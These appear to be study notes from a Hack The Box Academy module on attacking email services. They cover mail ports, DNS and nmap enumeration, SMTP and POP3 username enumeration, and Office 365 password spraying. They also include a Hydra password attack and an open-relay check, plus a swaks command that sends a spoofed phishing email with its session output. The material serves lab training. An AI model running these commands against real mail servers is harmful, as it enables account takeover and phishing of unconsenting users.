| Port    | Service                 |
| ------- | ----------------------- |
| TCP/25  | SMTP Unencrypted        |
| TCP/143 | IMAP4 Unencrypted       |
| TCP/110 | POP3 Unencrypted        |
| TCP/465 | SMTP Encrypted          |
| TCP/587 | SMTP Encrypted/STARTTLS |
| TCP/993 | IMAP4 Encrypted         |
| TCP/995 | POP3 Encrypted          |
![text](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

# Enumeration
We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:
#### Host - MX Records
```shell
host -t MX hackthebox.eu
```

```shell
host -t MX microsoft.com
```
#### DIG - MX Records
```shell
dig mx plaintext.do | grep "MX" | grep -v ";"
```

```shell
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```
#### Host - A Records
```shell
host -t A mail1.inlanefreight.htb
```
#### NMAP
```shell
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```
# Misconfigurations
- A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.
## Authentication
```shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
- The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. 
- If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password.
#### VRFY Command
```shell
telnet 10.10.110.20 25
```

```telnet
VRFY root
VRFY www-data
VRFY new-user
```
#### EXPN Command
```shell
telnet 10.10.110.20 25
```
```telnet
EXPN john
EXPN support-team
```
#### RCPT TO Command
```shell
telnet 10.10.110.20 25
```
```telnet
MAIL FROM:test@htb.com
it is

RCPT TO:julio
RCPT TO:kate
RCPT TO:john
```
#### USER Command
```shell
telnet 10.10.110.20 110
```
```telnet
USER julio
USER john
```
### smtp-user-enum
```shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
## Cloud Enumeration
### O365 Spray
```shell
python3 o365spray.py --validate --domain msplaintext.xyz
```
```shell
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```
#### O365 Spray - Password Spraying
```shell
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
## Password Attacks
#### Hydra - Password Attack
```shell
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
## Protocol Specifics Attacks
- An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay.
#### Open Relay
```shell
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
#### swaks
```shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```